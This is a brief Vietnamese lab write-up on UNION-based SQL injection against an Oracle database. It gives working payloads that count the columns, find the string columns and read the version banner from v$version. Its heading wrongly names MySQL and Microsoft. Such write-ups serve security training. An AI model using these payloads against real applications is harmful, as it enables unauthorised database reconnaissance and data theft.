## SQL injection attack, querying the database type and version on MySQL and Microsoft

1. Theo như đề bài, database của lab này là Oracle SQL nên truy vấn SELECT vào cũng chỉ định vào 1 table cụ thể. Trong Oracle cung cấp một build-in table ``dual`` nhằm mục đích truy vấn data ngoài bảng có sẵn.

2. Xác định số cột trong bảng category và xác định cột chứa kiểu dữ liệu string
Payload: 	```' UNION SELECT 'test' from dual --```
		 	```' UNION SELECT 'test', null from dual --```
		 	```' UNION SELECT null, 'test' from dual --```

![Img1](\asset/../img/determine_col_num.png)

-> Xác định được số cột là 2 và cả 2 cột đều có kiểu string
3. Để xác định database version trong Oracle dùng câu query ``SELECT banner FROM v$version``
Payload: 	```' UNION SELECT banner, null FROM v$version--```

![Img2](\asset/../img/done.png)